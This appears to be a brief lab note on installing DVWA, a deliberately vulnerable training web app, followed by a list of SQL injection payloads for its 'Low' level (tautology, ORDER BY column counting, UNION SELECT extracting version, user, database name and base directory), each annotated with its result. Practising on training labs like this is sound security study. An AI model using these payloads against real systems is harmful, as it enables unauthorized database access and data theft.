# DVWA

## Install
```bash
dnf -y install mariadb-server php-fpm nginx php php-gd
git clone https://github.com/digininja/DVWA.git
mv DVWA dvwa
cd dvwa/config
/bin/cp -rf config.inc.php.dist config.inc.php
vim config.inc.php # edit config.inc.php file and set database and key
```

## SQL Injection level Low
```sql
' or 1=1 # --Test ok
' order by 5 # --Test failed
' order by 3 # --Test Falied
' order by 2 # --Test Success
' or 1=1 order by 2 # --Get all data success.
' union select version(),current_user() # --Get version is 5.7.30 and current user is dvwa@localhost
' union select database(),2 # --Get database name is dvwa
' union select @@basedir,2 # --Get basedir is /usr/
```
